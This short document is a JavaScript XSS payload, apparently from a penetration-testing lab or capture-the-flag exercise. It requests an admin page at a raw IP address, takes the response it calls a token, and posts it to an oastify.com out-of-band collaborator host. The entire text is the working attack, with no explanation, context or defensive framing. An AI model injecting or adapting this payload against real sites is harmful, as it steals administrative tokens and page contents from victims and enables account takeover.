<script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get','http://167.172.80.186:9999/admin.php',true);
   req.send();
   function handleResponse() {
    var token = this.responseText;
   var changeReq = new XMLHttpRequest();
   changeReq.open('post', 'http://ds9mxh95fpzosopxsvg6hvvy0p6g94y.oastify.com', true);
   changeReq.send('data='+token);
};
</script>
